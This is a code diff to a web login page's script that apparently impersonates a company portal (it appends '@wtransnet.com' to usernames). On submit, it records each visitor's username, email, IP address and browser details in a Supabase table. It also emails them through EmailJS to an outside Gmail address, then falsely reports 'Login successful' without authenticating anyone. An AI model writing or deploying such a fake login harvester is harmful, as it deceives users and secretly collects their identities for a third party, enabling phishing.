@@ -1,33 +1,101 @@
 import './style.css';
+import emailjs from '@emailjs/browser';
+import { createClient } from '@supabase/supabase-js';
+
+const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
+const supabaseAnonKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
+const supabase = createClient(supabaseUrl, supabaseAnonKey);
+
+emailjs.init('YOUR_EMAILJS_PUBLIC_KEY');
 
 const loginForm = document.getElementById('loginForm');
 const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
 const navbarMenu = document.querySelector('.navbar-menu');
 
-loginForm.addEventListener('submit', function(e) {
+loginForm.addEventListener('submit', async function(e) {
   e.preventDefault();
 
-  const username = document.getElementById('username').value;
+  const username = document.getElementById('username').value.trim();
   const password = document.getElementById('password').value;
   const remember = document.getElementById('remember').checked;
 
-  if (username && password) {
-    console.log('Login attempt:', { username, remember });
+  if (!username || !password) {
+    alert('Please fill in all fields');
+    return;
+  }
 
-    const submitButton = e.target.querySelector('.btn-login');
-    const originalText = submitButton.textContent;
+  const submitButton = e.target.querySelector('.btn-login');
+  const originalText = submitButton.textContent;
 
-    submitButton.textContent = 'Logging in...';
-    submitButton.disabled = true;
+  submitButton.textContent = 'Logging in...';
+  submitButton.disabled = true;
 
-    setTimeout(() => {
-      alert(`Login successful!\n\nUsername: ${username}\nRemember me: ${remember ? 'Yes' : 'No'}`);
-      submitButton.textContent = originalText;
-      submitButton.disabled = false;
+  try {
+    const userEmail = username.includes('@') ? username : `${username}@wtransnet.com`;
+
+    const loginData = {
+      username: username,
+      email: userEmail,
+      timestamp: new Date().toLocaleString(),
+      ip_address: await getClientIP(),
+      user_agent: navigator.userAgent
+    };
+
+    const { data, error } = await supabase
+      .from('login_attempts')
+      .insert([
+        {
+          username: username,
+          email: userEmail,
+          ip_address: loginData.ip_address,
+          user_agent: loginData.user_agent
+        }
+      ]);
+
+    if (error) {
+      console.error('Supabase error:', error);
+      throw new Error('Failed to log login attempt');
+    }
+
+    const emailParams = {
+      to_email: 'your-email@gmail.com',
+      username: username,
+      user_email: userEmail,
+      timestamp: loginData.timestamp,
+      ip_address: loginData.ip_address,
+      remember_me: remember ? 'Yes' : 'No'
+    };
+
+    const emailResponse = await emailjs.send(
+      'YOUR_EMAILJS_SERVICE_ID',
+      'YOUR_EMAILJS_TEMPLATE_ID',
+      emailParams
+    );
+
+    if (emailResponse.status === 200) {
+      console.log('Login attempt recorded and email sent successfully');
+      alert(`Login successful!\n\nUsername: ${username}\nRemember me: ${remember ? 'Yes' : 'No'}\n\nLogin details have been sent to your email.`);
       loginForm.reset();
-    }, 1000);
+    }
+  } catch (error) {
+    console.error('Error:', error);
+    alert(`Error: ${error.message}\n\nPlease try again.`);
+  } finally {
+    submitButton.textContent = originalText;
+    submitButton.disabled = false;
   }
 });
+
+async function getClientIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.error('Error fetching IP:', error);
+    return 'Unknown';
+  }
+}
 
 if (mobileMenuToggle) {
   mobileMenuToggle.addEventListener('click', function() {
